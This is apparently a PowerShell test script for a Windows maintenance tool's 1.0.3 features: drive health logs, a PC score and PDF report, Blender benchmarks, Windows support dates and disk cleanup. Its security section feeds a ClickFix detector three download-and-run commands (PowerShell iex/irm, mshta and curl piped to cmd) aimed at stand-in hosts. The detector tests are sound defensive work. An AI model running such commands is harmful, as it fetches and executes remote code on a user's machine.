param([string]$ScriptPath, [string]$Sandbox)
# What 1.0.3 added: the PC passport (40) - the hardware's own logs read byte by byte, the score out of 100
# and its grades, the PDF with and without full serial numbers, what changed since the first passport,
# the Blender and memtest_vulkan results - and the maintenance items of 19, 21, 30, 33, 34 and 39.
$script:fail = 0
function Check([bool]$ok, [string]$what) {
    if ($ok) { Write-Host "ok   $what" } else { Write-Host "FAIL $what" -ForegroundColor Red; $script:fail++ }
}
if (Test-Path $Sandbox) { Remove-Item $Sandbox -Recurse -Force }
New-Item -ItemType Directory -Force "$Sandbox/tmp" | Out-Null
$ast = [System.Management.Automation.Language.Parser]::ParseFile($ScriptPath, [ref]$null, [ref]$null)
foreach ($fn in $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false)) { Invoke-Expression $fn.Extent.Text }
$src = (Get-Content -LiteralPath $ScriptPath -Raw).Replace("`r`n", "`n")
$stateText = $src.Substring($src.IndexOf('#  Settings & state')); $stateText = $stateText.Substring(0, $stateText.IndexOf('#  UI helpers'))
$env:ProgramData = "$Sandbox/ProgramData"; $env:TEMP = "$Sandbox/tmp"; $env:ProgramFiles = "$Sandbox/ProgramFiles"; $env:WINDIR = "$Sandbox/Windows"
$DryRun = $false; $Auto = $false
Invoke-Expression $stateText
$script:FR = Get-FrenchStrings
$script:Lang = 'en'
Import-Settings
New-Item -ItemType Directory -Force $script:DataDir | Out-Null
function Clear-Host { }

Write-Host "`n===== WHAT THE HARDWARE SAYS =====" -ForegroundColor White
# NVMe health log (page 02h): critical warning, temperature in kelvin, spare, used, counters of 16 bytes
$log = New-Object byte[] 512
$log[0] = 0; $log[1] = 0x3A; $log[2] = 0x01            # 314 K = 41 C
$log[3] = 100; $log[4] = 10; $log[5] = 4                # spare 100 %, threshold 10 %, 4 % used
$log[48] = 0x40; $log[49] = 0x42; $log[50] = 0x0F       # 1 000 000 data units written
$log[128] = 0x30; $log[129] = 0x0C                      # 3120 hours
$log[144] = 35                                          # 35 unsafe shutdowns
$n = ConvertFrom-NvmeHealthLog $log
Check ($n.Temp -eq 41 -and $n.Spare -eq 100 -and $n.SpareThreshold -eq 10 -and $n.Used -eq 4) 'NVMe log: 41 C, spare 100 % (threshold 10 %), 4 % used'
Check ($n.WrittenBytes -eq 1000000 * 512000 -and $n.Hours -eq 3120 -and $n.Unsafe -eq 35) 'NVMe log: data units of 512 000 bytes, hours and unsafe shutdowns'
Check ($null -eq (ConvertFrom-NvmeHealthLog (New-Object byte[] 64))) 'a log too short gives nothing'
Check ((Get-NvmeCriticalText 5) -eq 'spare space below its threshold, reliability reduced by media errors') 'critical warning bits said in words'
# SATA SMART: 30 attributes of 12 bytes after 2 bytes of version
$v = New-Object byte[] 362
$o = 2; $v[$o] = 177; $v[$o + 3] = 93; $v[$o + 4] = 93; $v[$o + 5] = 0x2C; $v[$o + 6] = 0x01   # wear leveling 93, raw 300
$o = 14; $v[$o] = 5; $v[$o + 3] = 100; $v[$o + 5] = 2                                        # 2 reallocated sectors
$a = ConvertFrom-AtaSmartData $v
Check ($a[177].Current -eq 93 -and $a[177].Raw -eq 300 -and $a[5].Raw -eq 2) 'SATA SMART attributes: current value and raw value'
$life = Get-AtaLifeLeft $a
Check ($life.Percent -eq 93 -and $life.Attribute -eq 177) 'life left of a Samsung SATA SSD from attribute 177'
Check ($null -eq (Get-AtaLifeLeft @{})) 'no wear attribute: life left not reported'
Check ((Get-MicrocodeRevision ([byte[]](0, 0, 0, 0, 0x2F, 0x01, 0, 0))) -eq 0x12F) 'Intel microcode revision from the upper 4 bytes (0x12F)'
Check ((Test-RaptorLakeDesktop 'Intel(R) Core(TM) i9-14900K') -and (Test-RaptorLakeDesktop '13th Gen Intel(R) Core(TM) i5-13400F')) 'Core 13th/14th gen desktop chips are recognised'
Check (-not (Test-RaptorLakeDesktop '13th Gen Intel(R) Core(TM) i7-13700H') -and -not (Test-RaptorLakeDesktop 'AMD Ryzen 7 7700X')) 'laptop chips and AMD are not'
$smi = ConvertFrom-NvidiaSmiLine 'NVIDIA GeForce RTX 3070, 63, 45, 180.21, 220.00, 0x0000000000000040, 8192'
Check ($smi.Temp -eq 63 -and $smi.FanPercent -eq 45 -and $smi.ThermalSlowdown -and $smi.VramMB -eq 8192) 'nvidia-smi line: temperature, fan, thermal slowdown, memory'
Check ((Get-Median @(5, 1, 3)) -eq 3 -and (Get-Median @(4, 1, 3, 2)) -eq 2.5) 'median of odd and even lists'
$cs = Get-CpuTestSummary @(110, 112, 111, 108, 100, 98, 99, 98, 97, 98, 97, 96) @(100, 100, 100, 95, 92, 90, 90, 90, 90, 90, 90, 90) @(4000, 4000, 3900)
Check ($cs.Sustain -gt 0.85 -and $cs.Sustain -lt 0.92 -and $cs.LimitMin -eq 90) "processor kept $([math]::Round($cs.Sustain * 100)) % of its speed, limit down to 90 %"
$dr = Get-DiskReadSummary @(500, 510, 505, 100, 502, 498) 0
Check ($dr.Median -ge 498 -and $dr.Min -eq 100 -and $dr.SlowShare -gt 0) 'disk read: median, slowest sample and the share of slow places'
$wav = New-ToneWav 1 0.2
$leftSamples = 0; for ($k = 44; $k + 1 -lt $wav.Count; $k += 4) { if ($wav[$k] -ne 0 -or $wav[$k + 1] -ne 0) { $leftSamples++ } }
Check ($wav.Count -gt 44 -and [System.Text.Encoding]::ASCII.GetString($wav, 0, 4) -eq 'RIFF' -and $leftSamples -eq 0 -and (Get-WavPeak $wav) -gt 30) 'a beep in the right speaker only: the left channel stays silent'

Write-Host "`n===== THE SCORE =====" -ForegroundColor White
Check ((Get-GradeFromScore 85) -eq 'A' -and (Get-GradeFromScore 84.9) -eq 'B' -and (Get-GradeFromScore 70) -eq 'B' -and (Get-GradeFromScore 50) -eq 'C' -and (Get-GradeFromScore 49) -eq 'D') 'grades: A from 85, B from 70, C from 50, D below'
Check ((Get-GradeFromScore 85 'battery') -eq 'A' -and (Get-GradeFromScore 80 'battery') -eq 'B' -and (Get-GradeFromScore 60 'battery') -eq 'C' -and (Get-GradeFromScore 59 'battery') -eq 'D') 'battery: 85 / 80 / 60, the Back Market threshold for computers'
Check ((Get-GradeFromScore 90 'ssd') -eq 'A' -and (Get-GradeFromScore 70 'ssd') -eq 'B' -and (Get-GradeFromScore 30 'ssd') -eq 'C' -and (Get-GradeFromScore 29 'ssd') -eq 'D') 'SSD life left: 90 / 70 / 30'
Check ((Get-PerfPoints 0.95) -eq 100 -and (Get-PerfPoints 1.2) -eq 100 -and (Get-PerfPoints 0.55) -eq 0 -and [math]::Round((Get-PerfPoints 0.75)) -eq 50 -and $null -eq (Get-PerfPoints $null)) 'performance: every point from 95 % of the median, none at 55 %, nothing without a reference'
Check ((Get-WorseGrade 'B' 'D') -eq 'D' -and (Get-WorseGrade '' 'C') -eq 'C') 'the worse of two grades'
$sampleFn = ($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $args[0].Name -eq 'Start-GuiPassportSample' }, $true) | Select-Object -First 1).Extent.Text -replace "`r`n", "`n"
Invoke-Expression (([regex]::Match($sampleFn, "(?s)@'\n(.*?)\n'@")).Groups[1].Value -replace 'Show-PcPassport \$p\s*$', '')
Check ($null -ne $p -and $p.Cpu.Name) 'the made-up passport of the window pictures loads'
$s = Get-PassportScore $p
Check ($s.Global -ge 0 -and $s.Global -le 100 -and @($s.Components).Count -ge 6) "a score out of 100 ($($s.Global)) from $(@($s.Components).Count) parts"
$worst = @($s.Components | Where-Object { $_.Grade } | Sort-Object Grade -Descending)[0].Grade
Check ($s.Grade -eq $worst -and $s.LimitedBy) "the grade of the PC is the grade of its weakest part ($($s.Grade), limited by $($s.LimitedBy))"
$cpu = @($s.Components | Where-Object { $_.Id -eq 'cpu' })[0]
Check ($cpu.Score -ge 85 -and @($cpu.Factors).Count -eq 4 -and ($cpu.Factors | Measure-Object Weight -Sum).Sum -eq 100) 'processor: 4 factors weighted 40 / 25 / 20 / 15'
$bat = @($s.Components | Where-Object { $_.Id -eq 'battery' })[0]
Check ($bat.Score -eq 83 -and $bat.Grade -eq 'B') 'battery at 83 %: score 83, grade B'
$p2 = $p | ConvertTo-Json -Depth 8 | ConvertFrom-Json
$p2.Cpu.Check.Errors = 2; $p2.Cpu.Check.ErrorCores = @(3)
$p2.Battery = $null
$s2 = Get-PassportScore $p2
$cpu2 = @($s2.Components | Where-Object { $_.Id -eq 'cpu' })[0]
Check ($cpu2.Grade -eq 'D' -and $s2.Grade -eq 'D') 'one wrong computation: the processor gets D, and so does the PC'
Check (@($s2.Components | Where-Object { $_.Id -eq 'battery' }).Count -eq 0 -and $s2.Global -ge 0) 'a desktop (no battery): the weights are shared among the other parts'
$p3 = $p | ConvertTo-Json -Depth 8 | ConvertFrom-Json
$p3.Events.Whea18 = 1
Check ((@((Get-PassportScore $p3).Components | Where-Object { $_.Id -eq 'cpu' })[0]).Grade -eq 'D') 'a fatal hardware error in 90 days: processor D'

Write-Host "`n===== THE PDF AND WHAT CHANGED =====" -ForegroundColor White
Check ((Hide-Serial 'S5P2NG0R123456') -eq '********3456' -and (Hide-Serial 'AB1') -eq 'AB1') 'a listing keeps the last 4 characters of a serial number'
$p.Disks[0].Serial = 'S5P2NG0R123456'
$html = New-PassportHtml $p $s
$masked = New-PassportHtml $p $s -Mask
Check ($html -match 'S5P2NG0R123456' -and $masked -notmatch 'S5P2NG0R123456' -and $masked -match '\*+3456') 'full serial numbers for a professional, shortened for a listing'
Check ($html -match 'Method and limits' -and $html -match 'Margin' -and $html -match 'Blender') 'the PDF explains the method, the margin and the limits'
Check ($html -notmatch [regex]::Escape("$env:USERNAME") -or -not $env:USERNAME) 'no user name in it'
$fr = [System.Net.WebUtility]::HtmlDecode((New-PassportHtml $p $s -Language 'fr'))
Check ($fr -match 'Méthode et limites' -and $fr -match 'PASSEPORT|Passeport') 'the PDF in French'
$old = $p | ConvertTo-Json -Depth 8 | ConvertFrom-Json
$old.When = '2026-05-01T10:00:00'; $old.Battery.Health = 90; $old.Disks[0].LifeLeft = 98; $old.Disks[0].WrittenBytes = 10TB; $old.Cpu.Blender.Score = 160
$lines = @(Compare-Passports $old $p)
Check (@($lines | Where-Object { $_ -match 'Battery: 83 % now, 90 % on 2026-05-01' }).Count -eq 1) 'what changed: the battery since the first passport'
Check (@($lines | Where-Object { $_ -match '96 % of life left now, 98 %' }).Count -eq 1 -and @($lines | Where-Object { $_ -match 'written since' }).Count -eq 1) 'what changed: the drive''s life left and the data written'
Check (@($lines | Where-Object { $_ -match 'Processor: 6 % slower' }).Count -eq 1) 'what changed: the processor 6 % slower with the same Blender'
$old.Disks[0].Hours = 9999
Check (@(Compare-Passports $old $p | Where-Object { $_ -match 'counter went back' }).Count -eq 1) 'a counter that went back is said'
Check ((Get-PassportDay ([datetime]'2026-05-01T10:00:00')) -eq '2026-05-01' -and (Get-PassportDay '2026-05-01T10:00:00') -eq '2026-05-01') 'the day of a passport, read back as text or as a date'
Save-PassportRecord $p | Out-Null
Check (@(Read-PassportRecords).Count -eq 1) 'each passport is kept as a JSON file in the Passports folder'

Write-Host "`n===== BLENDER AND MEMTEST_VULKAN =====" -ForegroundColor White
$j = '[ { "blender_version": { "version": "4.5.0" }, "device_info": { "device_type": "CPU", "compute_devices": [ { "type": "CPU", "name": "AMD Ryzen 9 5950X 16-Core Processor" } ] }, "scene": { "label": "monster" }, "stats": { "samples_per_minute": 131.8 } }, { "scene": { "label": "junkshop" }, "stats": { "samples_per_minute": 69.4 } }, { "scene": { "label": "classroom" }, "stats": { "samples_per_minute": 68.6 } } ]'
$b = ConvertFrom-BlenderJson ("progress lines`n" + $j + "`nend")
Check ($b.Scenes.Count -eq 3 -and $b.Version -eq '4.5.0' -and $b.Device -like 'AMD Ryzen 9 5950X*') 'the JSON of the Blender Benchmark: 3 scenes, version and device'
Check ((ConvertTo-BenchKey 'cpu' 'Intel(R) Core(TM) i7-8700  CPU') -eq 'CPU|intel core i7-8700' -and (ConvertTo-BenchVersion '4.5.1') -eq '4.5') 'device names written the same way as the medians builder writes them'
$med = '{"devices":{"CPU|amd ryzen 9 5950x 16-core processor":{"4.5":{"monster":[140,300],"junkshop":[70,280],"classroom":[70,290]}}}}' | ConvertFrom-Json
$ref = Find-BlenderMedian $med 'CPU' 'AMD Ryzen 9 5950X 16-Core Processor' '4.5.0'
$cmp = Get-BlenderComparison $b.Scenes $ref
Check ($cmp.Count -eq 280 -and $cmp.Scenes -eq 3 -and $cmp.Ratio -gt 0.96 -and $cmp.Ratio -lt 0.98) "against the median of the same model: $([math]::Round($cmp.Ratio * 100)) % (smallest sample 280 results)"
Check ($null -eq (Find-BlenderMedian $med 'CPU' 'Unknown chip' '4.5') -and $null -eq (Get-BlenderComparison $b.Scenes $null)) 'no reference for a model: measured, not compared'
Check (@(Get-BlenderVersionsFor $med 'CPU' 'AMD Ryzen 9 5950X 16-Core Processor')[0].Version -eq '4.5') 'the Blender version with the most public results is picked'
Check ((ConvertFrom-MemtestLog 'Standard 5-minute test PASSed! Just press Ctrl+C').Result -eq 'ok' -and (ConvertFrom-MemtestLog 'Error found. Mode NEXT_RE_READ').Result -eq 'errors') 'memtest_vulkan: passed, or errors found'
$repo = Split-Path -Parent $ScriptPath
$mf = Join-Path $repo 'data/blender-medians.json'
Check ((Test-Path -LiteralPath $mf) -and $null -ne (Get-Content -LiteralPath $mf -Raw | ConvertFrom-Json).devices) 'data/blender-medians.json is there, with its devices'
Check ($script:BlenderMediansUrl -eq 'https://raw.githubusercontent.com/b-draoui/yso/main/data/blender-medians.json' -and @($script:BlenderLauncherUrls | Where-Object { $_ -notlike 'https://download.blender.org/*' }).Count -eq 0) 'downloads only from YSO''s repository and download.blender.org'
$wf = Get-Content -LiteralPath (Join-Path $repo '.github/workflows/blender-medians.yml') -Raw
Check ($wf -match 'build-blender-medians\.py' -and $wf -match 'schedule') 'a weekly workflow builds the medians'

Write-Host "`n===== WINDOWS SUPPORT AND SECURITY (19, 21) =====" -ForegroundColor White
$day = [datetime]'2026-11-19'
$w = Get-WindowsSupportState ([pscustomobject]@{ Build = 26100; Version = '24H2'; Edition = 'Professional' }) $day
Check ($w.Level -eq 'Bad' -and $w.End -eq [datetime]'2026-10-13') 'Windows 11 24H2 Pro: updates ended on 13 October 2026'
$w = Get-WindowsSupportState ([pscustomobject]@{ Build = 26100; Version = '24H2'; Edition = 'Enterprise' }) $day
Check ($w.Level -eq 'Good' -and $w.End -eq [datetime]'2027-10-12') 'the same version in Enterprise: until 12 October 2027'
$w = Get-WindowsSupportState ([pscustomobject]@{ Build = 26200; Version = '25H2'; Edition = 'Core' }) ([datetime]'2027-08-01')
Check ($w.Level -eq 'Warn') '25H2 Home less than 90 days before its end: a warning'
$w = Get-WindowsSupportState ([pscustomobject]@{ Build = 19045; Version = '22H2'; Edition = 'Professional' }) $day
Check ($w.Level -eq 'Warn' -and $w.Esu -and $w.End -eq [datetime]'2027-10-12') 'Windows 10 22H2: covered until 12 October 2027 only with Extended Security Updates'
$w = Get-WindowsSupportState ([pscustomobject]@{ Build = 19044; Version = '21H2'; Edition = 'EnterpriseS' }) $day
Check ($w.Level -eq 'Warn' -and $w.End -eq [datetime]'2027-01-12') 'Windows 10 LTSC 2021: until 12 January 2027, less than 90 days away'
$w = Get-WindowsSupportState ([pscustomobject]@{ Build = 26300; Version = '27H2'; Edition = 'Core' }) $day
Check ($w.Level -eq 'Good' -and $null -eq $w.End) 'a version newer than the table: supported, no date made up'
Check (Test-SuspiciousCommand 'powershell -w h -c "iex(irm https://bad.example/x)"') 'ClickFix: PowerShell that downloads and runs'
Check ((Test-SuspiciousCommand 'mshta https://bad.example/a.hta') -and (Test-SuspiciousCommand 'cmd /c curl -s http://1.2.3.4/a | cmd')) 'ClickFix: mshta and curl'
Check (-not (Test-SuspiciousCommand 'notepad') -and -not (Test-SuspiciousCommand 'cmd') -and -not (Test-SuspiciousCommand 'powershell')) 'ordinary Win+R commands are not flagged'
$h = @(Get-HostsEntries @('# comment', '127.0.0.1 localhost', '::1 localhost', '0.0.0.0 ads.example.com tracker.example.net', '0.0.0.0 update.microsoft.com', '203.0.113.5 www.mybank.example'))
Check ($h.Count -eq 4) 'hosts file: comments and localhost left out'
Check (@($h | Where-Object { -not $_.Blocks }).Count -eq 1 -and @($h | Where-Object { $_.Blocks -and $_.Security }).Name -eq 'update.microsoft.com') 'a site sent elsewhere, and a blocked update site, are told apart from an ad blocker list'
Check (@(Get-MemoryAdvice ([pscustomobject]@{ Sticks = @([pscustomobject]@{ Rated = 3200; Speed = 2133 }); Single = $true })).Count -eq 2) 'memory slower than it is made for, and one stick alone: two pieces of advice'
Check (@(Get-MemoryAdvice ([pscustomobject]@{ Sticks = @([pscustomobject]@{ Rated = 3200; Speed = 3200 }, [pscustomobject]@{ Rated = 3200; Speed = 3200 }); Single = $false })).Count -eq 0) 'two sticks at full speed: nothing to say'

Write-Host "`n===== BROWSERS (39) AND PRIVACY (30) =====" -ForegroundColor White
Check ((ConvertTo-SiteName 'https://news.example.com:443,*') -eq 'news.example.com' -and (ConvertTo-SiteName '[*.]example.org,*') -eq 'example.org') 'notification sites written plainly'
Check ((Test-KnownSearchEngine 'https://www.google.com/search?q={searchTerms}') -and (Test-KnownSearchEngine 'https://duckduckgo.com/?q={searchTerms}') -and (Test-KnownSearchEngine '')) 'known search engines'
Check (-not (Test-KnownSearchEngine 'https://search.hijacker.example/?q={searchTerms}')) 'an unknown search engine is flagged'
$pua = @(Get-PrivacyGroups | Where-Object { $_.Id -eq 'pua' })[0]
Check ($pua -and $pua.Recommended -and ((@($pua.Values | ForEach-Object { $_[1] }) -join ',') -eq 'PUAProtection,SmartScreenPuaEnabled')) 'unwanted apps: Defender and Edge block them (recommended)'

Write-Host "`n===== MORE SPACE (33) AND FILES (34) =====" -ForegroundColor White
$dism = @('Component Store (WinSxS) information:', 'Windows Explorer Reported Size of Component Store : 9.12 GB', 'Actual Size of Component Store : 7.65 GB',
    '    Shared with Windows : 5.63 GB', '    Backups and Disabled Features : 1.96 GB', '    Cache and Temporary Data :  0 bytes',
    'Number of Reclaimable Packages : 2', 'Component Store Cleanup Recommended : Yes')
$c = ConvertFrom-ComponentStoreAnalysis $dism
Check ($c.Size -eq [long](7.65 * 1GB) -and $c.Backups -eq [long](1.96 * 1GB) -and $c.Packages -eq 2 -and $c.Recommended) 'DISM analysis read: size, old copies, reclaimable updates, recommended'
Check ($null -eq (ConvertFrom-ComponentStoreAnalysis @('Error: 87'))) 'DISM failed: nothing is offered'
$parts = @(Get-UnusedLanguageParts @('Language.Handwriting~~~fr-CA~0.0.1.0', 'Language.OCR~~~de-DE~0.0.1.0', 'Language.Speech~~~en-US~0.0.1.0', 'Language.Basic~~~de-DE~0.0.1.0', 'Language.TextToSpeech~~~de-DE~0.0.1.0') @('fr-CA'))
Check (((@($parts | ForEach-Object { $_.Name })) -join ',') -eq 'Language.OCR~~~de-DE~0.0.1.0,Language.TextToSpeech~~~de-DE~0.0.1.0') 'unused languages: OCR and speech of German go; your language, English (US) and spelling stay'
Check ((Get-ChangeItemText ([pscustomobject]@{ Kind = 'capability'; Name = 'XPS.Viewer~~~~0.0.1.0'; Label = 'XPS Viewer' })) -match 'XPS Viewer') 'a removed part of Windows is in the journal, with how it comes back'
Check ((Get-ProjectBuildKind 'node_modules' @('package.json', 'index.js')) -eq 'npm install' -and (Get-ProjectBuildKind 'node_modules' @('readme.md')) -eq '') 'node_modules counts only next to a package.json'
Check ((Get-ProjectBuildKind 'target' @('Cargo.toml')) -eq 'cargo build' -and (Get-ProjectBuildKind 'bin' @('App.csproj')) -eq 'dotnet build' -and (Get-ProjectBuildKind 'bin' @('notes.txt')) -eq '') 'target and bin only in real projects'
$root = Join-Path $Sandbox 'code'
foreach ($d in @('old-app/node_modules/left-pad', 'new-app/node_modules/x', 'rust/target/debug', 'AppData/proj/node_modules', '.hidden/proj/node_modules', 'docs/bin')) { New-Item -ItemType Directory -Force (Join-Path $root $d) | Out-Null }
foreach ($f in @('old-app/package.json', 'new-app/package.json', 'rust/Cargo.toml', 'AppData/proj/package.json', '.hidden/proj/package.json', 'old-app/node_modules/left-pad/package.json', 'old-app/node_modules/left-pad/index.js')) { Set-Content -LiteralPath (Join-Path $root $f) -Value ('x' * 2000) }
(Get-Item (Join-Path $root 'old-app/package.json')).LastWriteTime = (Get-Date).AddDays(-200)
$found = @(Find-ProjectBuildFolders @($root))
$names = @($found | ForEach-Object { (Split-Path -Leaf (Split-Path -Parent $_.Path)) + '/' + (Split-Path -Leaf $_.Path) } | Sort-Object)
Check (($names -join ',') -eq 'new-app/node_modules,old-app/node_modules,rust/target') "build folders found, AppData and hidden folders skipped ($($names -join ', '))"
Check (((@($found | Where-Object { $_.Usual } | ForEach-Object { $_.Project })) -join ',') -eq 'old-app') 'only the project untouched for 90 days is ticked'
Check ((@($found | Where-Object { $_.Project -eq 'old-app' })[0]).Bytes -ge 4000) 'its size is measured'
Check ($src -match "rd /s /q") 'build folders are deleted with rd, which handles very long paths'

Write-Host "`n===== MENUS AND HELP =====" -ForegroundColor White
Check ($script:MenuKeys -contains '40') 'key 40 runs the PC passport'
Check ((Get-HelpTopics | Where-Object { $_.Key -eq '40' }).What -match 'score out of 100') 'the passport has its page in the guide'
Check ((Get-HelpTopics | Where-Object { $_.Key -eq '40' }).Changes -match '5 points' -and (Get-HelpTopics | Where-Object { $_.Key -eq '40' }).Changes -match '2 to 3 points') 'and it says the margin: 5 points, 2 to 3 between two passports'
$groups = @(Get-GuiToolGroups | ForEach-Object { $_.Items } | ForEach-Object { $_[0] })
Check ($groups -contains '40') 'and a place in the window''s groups'
Check ($null -ne (Get-GuiToolInfo '40')) 'and an icon with a sentence'

if ($script:fail -eq 0) { Write-Host "`nRESULT: ALL CHECKS PASSED" -ForegroundColor Green } else { Write-Host "`nRESULT: $($script:fail) FAILURE(S)" -ForegroundColor Red; exit 1 }
